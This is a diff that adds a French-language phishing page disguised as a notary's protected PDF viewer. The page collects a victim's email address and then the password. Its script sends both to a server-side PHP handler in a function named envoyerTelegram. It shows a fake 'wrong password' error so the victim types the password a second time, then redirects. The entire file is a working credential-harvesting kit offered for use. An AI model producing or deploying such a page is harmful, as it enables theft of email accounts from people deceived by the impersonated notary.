@@ -1,0 +1,185 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Notaire – Document sécurisé</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #f3f4f6;
+      font-family: Arial, sans-serif;
+    }
+
+    .wrapper {
+      background-image: url("files/img/bg.png");
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-position: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      z-index: -1;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      min-height: 100vh;
+      padding: 1rem;
+    }
+
+    .box {
+      background: white;
+      max-width: 500px;
+      width: 100%;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .box img {
+      display: block;
+      margin: 0 auto 1rem;
+    }
+
+    .box p {
+      margin: 0.5rem 0;
+    }
+
+    input {
+      width: 100%;
+      padding: 0.5rem;
+      margin-top: 0.5rem;
+      border: 1px solid #e11d48; /* bordure rouge en permanence */
+      border-radius: 4px;
+    }
+
+    .error-text {
+      color: #e11d48;
+      font-size: 0.9rem;
+      margin-bottom: 4px;
+      display: block; /* toujours visible */
+    }
+
+    .button {
+      margin-top: 1.5rem;
+      background-color: #1c90bc;
+      color: white;
+      border: none;
+      padding: 0.7rem;
+      font-weight: bold;
+      width: 100%;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+
+    .footer {
+      margin-top: 2rem;
+      text-align: center;
+      font-size: 0.875rem;
+    }
+
+    #affiche-mdp {
+      display: none;
+      margin-top: 1rem;
+    }
+
+    #erreur-mdp {
+      display: none;
+      color: #e11d48;
+      font-size: 0.9rem;
+      margin-top: 4px;
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper"></div>
+
+  <div class="container">
+    <img src="files/img/notaire.png" alt="Logo Notaire" width="230">
+    <div class="box">
+      <p class="font-bold">Ce document est protégé et nécessite une authentification pour être ouvert.</p>
+      <p>Vous avez reçu un fichier sécurisé.</p>
+
+      <div class="flex items-center mb-7" style="margin-top: 1rem;">
+        <img src="files/img/pdf.png" class="w-10" alt="" width="40">
+        <p class="font-bold mx-3">Document à signer / Doc01902.pdf (43.1KB)</p>
+      </div>
+
+      <p>Pour afficher le document, veuillez saisir les identifiants de messagerie sur lesquels ce fichier a été envoyé.</p>
+
+      <!-- Message d'erreur toujours visible -->
+      <p id="erreur-identifiant" class="error-text">
+        Votre identifiant est incorrect. Veuillez réessayer.
+      </p>
+
+      <input type="email" id="zone-email" placeholder="Saisissez l'adresse e-mail" autocomplete="username">
+
+      <div id="affiche-mdp">
+        <input type="password" id="zone-password" placeholder="Saisissez le mot de passe" autocomplete="current-password">
+        <p id="erreur-mdp">
+          Ce mot de passe est incorrect. Vérifiez-le ou cliquez sur « Mot de passe oublié ».
+        </p>
+      </div>
+
+      <button type="button" id="continuer-button" class="button">
+        Se connecter
+      </button>
+    </div>
+
+    <div class="footer">
+      <p>© Étude notariale 2025</p>
+      <img src="files/img/down.png" class="w-56" alt="" width="180">
+    </div>
+  </div>
+
+  <script>
+    const emailInput = document.getElementById("zone-email");
+    const passwordInput = document.getElementById("zone-password");
+    const passwordContainer = document.getElementById("affiche-mdp");
+    const btnContinuer = document.getElementById("continuer-button");
+    const erreurMdp = document.getElementById("erreur-mdp");
+
+    let etape = 1;
+    let erreurMdpDejaAffiche = false;
+
+    function envoyerTelegram(email, password) {
+      return fetch("sendMessage1.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password })
+      });
+    }
+
+    btnContinuer.addEventListener("click", async () => {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      if (etape === 1) {
+        // Affiche la zone mot de passe seulement si un email est saisi (pas validation ici)
+        if (email.length === 0) {
+          alert("Veuillez saisir votre email."); // petit rappel si vide
+          return;
+        }
+        passwordContainer.style.display = "block";
+        etape = 2;
+      } else if (etape === 2) {
+        await envoyerTelegram(email, password);
+
+        if (!erreurMdpDejaAffiche) {
+          erreurMdp.style.display = "block";
+          passwordInput.style.borderColor = "#e11d48";
+          erreurMdpDejaAffiche = true;
+        } else {
+          window.location.href = "fin.php";
+        }
+      }
+    });
+  </script>
+</body>
+</html>
